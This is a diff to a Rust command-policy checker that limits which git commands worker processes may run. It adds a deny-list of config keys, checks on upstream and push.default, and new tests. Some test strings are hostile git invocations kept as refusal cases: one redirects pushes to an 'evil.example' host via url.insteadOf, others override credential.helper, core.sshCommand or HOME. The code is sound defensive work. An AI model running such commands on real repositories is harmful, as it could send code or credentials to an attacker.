@@ -128,18 +128,14 @@ pub fn check(policy: &SessionPolicy, command: &str, cwd: &Path) -> Option<String
             // A git line may not name a variable or the home directory that
             // decides where git reads its configuration or which repository it
             // opens: `HOME=… git push` reads another user's config (WI-1327).
-            const SOURCES: [&str; 6] = [
-                "GIT_CONFIG",
-                "GIT_DIR",
-                "GIT_COMMON_DIR",
-                "GIT_WORK_TREE",
-                "HOME",
-                "XDG_CONFIG_HOME",
-            ];
             let git_line_present = command
                 .split(|c: char| c.is_whitespace() || ";&|()".contains(c))
                 .any(|token| base(token) == "git");
-            if git_line_present && SOURCES.iter().any(|source| command.contains(source)) {
+            if git_line_present
+                && worker_commands(command)
+                    .iter()
+                    .any(|simple| simple.split_whitespace().any(assigns_source))
+            {
                 return Some(
                     "refusing: a worker may not change where git reads its configuration from"
                         .to_string(),
@@ -364,11 +360,10 @@ fn worker_git(
 ) -> Option<String> {
     if command_line_config(words)
         .iter()
-        .any(|key| !key.starts_with("user."))
+        .any(|key| denied_config_key(key))
     {
         return Some(
-            "refusing: a worker may set only user.* git configuration on the command line"
-                .to_string(),
+            "refusing: a worker may not set this git configuration on the command line".to_string(),
         );
     }
     if words
@@ -382,6 +377,9 @@ fn worker_git(
         Some("push") => worker_push(words, pattern, policy, &dir),
         Some("config") => (!read_only_config(words))
             .then(|| "refusing: a worker may read git configuration but not change it".to_string()),
+        Some("branch") if sets_upstream_to_landing(words, policy) => {
+            Some("refusing: a worker may not make a landing branch its upstream".to_string())
+        }
         Some("remote")
             if words
                 .iter()
@@ -394,6 +392,53 @@ fn worker_git(
             .then(|| "refusing: a worker may not run a git alias".to_string()),
         None => None,
     }
+}
+
+/// The `-c` keys a worker may not set (lowercased): anything that changes what
+/// a push sends or where, which alias, include, URL, credential, transport or
+/// worktree git follows, or which program it runs for them. Other keys (colour,
+/// pager, diff options) cannot widen a push, so they are allowed.
+fn denied_config_key(key: &str) -> bool {
+    const PREFIXES: &[&str] = &[
+        "push.",
+        "remote.",
+        "branch.",
+        "alias.",
+        "include.",
+        "includeif.",
+        "url.",
+        "credential.",
+        "http.",
+        "protocol.",
+        "core.worktree",
+        "core.hookspath",
+        "core.sshcommand",
+        "core.bare",
+    ];
+    PREFIXES.iter().any(|prefix| key.starts_with(prefix))
+}
+
+/// Whether a `git branch -u` / `--set-upstream-to` names a landing branch,
+/// by its name or as `<remote>/<name>`.
+fn sets_upstream_to_landing(words: &[String], policy: &SessionPolicy) -> bool {
+    let mut target = None;
+    let mut iter = words.iter().map(String::as_str);
+    while let Some(word) = iter.next() {
+        if word == "-u" || word == "--set-upstream-to" {
+            target = iter.next();
+        } else if let Some(rest) = word
+            .strip_prefix("--set-upstream-to=")
+            .or_else(|| word.strip_prefix("-u").filter(|rest| !rest.is_empty()))
+        {
+            target = Some(rest);
+        }
+    }
+    target.is_some_and(|target| {
+        policy
+            .landing_mains
+            .iter()
+            .any(|main| target == main || target.ends_with(&format!("/{main}")))
+    })
 }
 
 /// Whether a `git config` only reads: a read flag and no write flag, or a
@@ -416,11 +461,6 @@ fn read_only_config(words: &[String]) -> bool {
         "--get-urlmatch",
         "--list",
         "-l",
-        "--show-origin",
-        "--show-scope",
-        "--name-only",
-        "--null",
-        "-z",
     ];
     let args = git_args(words);
     let args = &args[1..];
@@ -452,6 +492,19 @@ fn command_line_config(words: &[String]) -> Vec<String> {
         }
     }
     keys
+}
+
+/// Whether a word assigns one of the variables that decide where git reads
+/// its configuration or which repository it opens (`HOME=…`, `GIT_CONFIG_GLOBAL=…`).
+/// A path that merely mentions `$HOME` is not an assignment.
+fn assigns_source(word: &str) -> bool {
+    let Some((name, _)) = word.split_once('=') else {
+        return false;
+    };
+    matches!(
+        name,
+        "HOME" | "XDG_CONFIG_HOME" | "GIT_DIR" | "GIT_COMMON_DIR" | "GIT_WORK_TREE"
+    ) || name.starts_with("GIT_CONFIG")
 }
 
 /// A `git push` by a worker. Explicit refspecs must each name the worker's
@@ -524,18 +577,44 @@ fn worker_push(
                 .find_map(|r| worker_refspec(r, current.as_deref(), pattern, policy));
         }
     }
-    if git_line(dir, &["config", "--get", "push.default"]).as_deref() == Some("matching") {
-        return Some(
+    let mode = git_line(dir, &["config", "--get", "push.default"]);
+    match (mode.as_deref().unwrap_or("simple"), current) {
+        ("matching", _) => Some(
             "refusing: a worker may not push with push.default=matching, which pushes every matching branch"
                 .to_string(),
-        );
-    }
-    match current {
-        Some(branch) => worker_ref(&branch, pattern, policy),
-        None => Some(format!(
+        ),
+        ("nothing", _) => None,
+        (_, None) => Some(format!(
             "refusing: a worker pushes only its own branch (pattern {pattern}), and the current branch is unknown"
         )),
+        ("upstream" | "tracking", Some(branch)) => match upstream_branch(dir, &branch) {
+            Some(target) => worker_ref(&target, pattern, policy),
+            None => Some(
+                "refusing: push.default=upstream and this branch has no upstream to check"
+                    .to_string(),
+            ),
+        },
+        ("simple", Some(branch)) => match upstream_branch(dir, &branch) {
+            Some(target) if target != branch => Some(
+                "refusing: push.default=simple would send this branch to a different branch name"
+                    .to_string(),
+            ),
+            _ => worker_ref(&branch, pattern, policy),
+        },
+        (_, Some(branch)) => worker_ref(&branch, pattern, policy),
     }
+}
+
+/// The branch the current branch's upstream names on its remote
+/// (`branch.<name>.merge`), without `refs/heads/`.
+fn upstream_branch(dir: &Path, branch: &str) -> Option<String> {
+    let key = format!("branch.{branch}.merge");
+    git_line(dir, &["config", "--get", &key]).map(|merge| {
+        merge
+            .strip_prefix("refs/heads/")
+            .unwrap_or(&merge)
+            .to_string()
+    })
 }
 
 /// The remote a push with no refspec goes to, as git picks it: the branch's
@@ -5648,5 +5727,122 @@ mod tests {
             assert!(refused(&worker, command, &dir), "should refuse: {command}");
         }
         assert!(!refused(&worker, "git push origin wi-1298-x", &dir));
+    }
+
+    #[test]
+    fn a_worker_cannot_write_config_through_output_flags() {
+        let dir = config_repo("outflags", "wi-1298-x", &[]);
+        let worker = worker_on_1298();
+        for command in [
+            "git config -z push.default upstream",
+            "git config --null remote.origin.mirror true",
+            "git config --show-origin --name-only push.default upstream",
+        ] {
+            assert!(refused(&worker, command, &dir), "should refuse: {command}");
+        }
+        assert!(!refused(&worker, "git config --get -z push.default", &dir));
+    }
+
+    #[test]
+    fn a_plain_push_checks_the_branch_its_push_default_sends_to() {
+        let worker = worker_on_1298();
+        let upstream_main = config_repo(
+            "up-main",
+            "wi-1298-x",
+            &[
+                ("push.default", "upstream"),
+                ("branch.wi-1298-x.remote", "origin"),
+                ("branch.wi-1298-x.merge", "refs/heads/main"),
+            ],
+        );
+        assert!(refused(&worker, "git push origin", &upstream_main));
+        assert!(refused(&worker, "git push", &upstream_main));
+        let simple_main = config_repo(
+            "simple-main",
+            "wi-1298-x",
+            &[
+                ("push.default", "simple"),
+                ("branch.wi-1298-x.remote", "origin"),
+                ("branch.wi-1298-x.merge", "refs/heads/main"),
+            ],
+        );
+        assert!(refused(&worker, "git push origin", &simple_main));
+        let own_upstream = config_repo(
+            "own-up",
+            "wi-1298-x",
+            &[
+                ("push.default", "upstream"),
+                ("branch.wi-1298-x.remote", "origin"),
+                ("branch.wi-1298-x.merge", "refs/heads/wi-1298-x"),
+            ],
+        );
+        assert!(!refused(&worker, "git push origin", &own_upstream));
+        let current = config_repo(
+            "current-main",
+            "wi-1298-x",
+            &[
+                ("push.default", "current"),
+                ("branch.wi-1298-x.merge", "refs/heads/main"),
+            ],
+        );
+        assert!(!refused(&worker, "git push origin", &current));
+    }
+
+    #[test]
+    fn a_worker_cannot_make_a_landing_branch_its_upstream() {
+        let worker = worker_on_1298();
+        let dir = config_repo("setup-up", "wi-1298-x", &[]);
+        for command in [
+            "git branch -u origin/main",
+            "git branch --set-upstream-to=origin/main",
+            "git branch --set-upstream-to origin/main",
+            "git branch -uorigin/main",
+            "git branch -u main",
+        ] {
+            assert!(refused(&worker, command, &dir), "should refuse: {command}");
+        }
+        assert!(!refused(&worker, "git branch -u origin/wi-1298-x", &dir));
+    }
+
+    #[test]
+    fn a_git_line_names_its_config_source_only_as_an_assignment() {
+        let worker = worker_on_1298();
+        let dir = config_repo("assign", "wi-1298-x", &[]);
+        for command in [
+            "env HOME=/tmp/h git push origin wi-1298-x",
+            "sh -c 'HOME=/tmp/h git push origin wi-1298-x'",
+            "export HOME=/tmp/h; git push origin wi-1298-x",
+            "HOME=/tmp/h; git push origin wi-1298-x",
+        ] {
+            assert!(refused(&worker, command, &dir), "should refuse: {command}");
+        }
+        for command in [
+            "cd \"$HOME/src\" && git push origin wi-1298-x",
+            "git -C $HOME/repo push origin wi-1298-x",
+        ] {
+            assert!(!refused(&worker, command, &dir), "should allow: {command}");
+        }
+    }
+
+    #[test]
+    fn a_worker_may_set_harmless_config_keys_but_not_push_or_transport_keys() {
+        let worker = worker_on_1298();
+        let dir = config_repo("keys", "wi-1298-x", &[]);
+        for command in [
+            "git -c color.ui=always push origin wi-1298-x",
+            "git -c core.pager=cat push origin wi-1298-x",
+        ] {
+            assert!(!refused(&worker, command, &dir), "should allow: {command}");
+        }
+        for command in [
+            "git -c branch.wi-1298-x.merge=refs/heads/main push origin wi-1298-x",
+            "git -c url.https://evil.example/.insteadOf=https://github.com/ push origin wi-1298-x",
+            "git -c credential.helper=x push origin wi-1298-x",
+            "git -c core.sshCommand=x push origin wi-1298-x",
+            "git -c protocol.file.allow=always push origin wi-1298-x",
+            "git -c push.default=upstream push origin wi-1298-x",
+        ] {
+            assert!(refused(&worker, command, &dir), "should refuse: {command}");
+        }
     }
 }
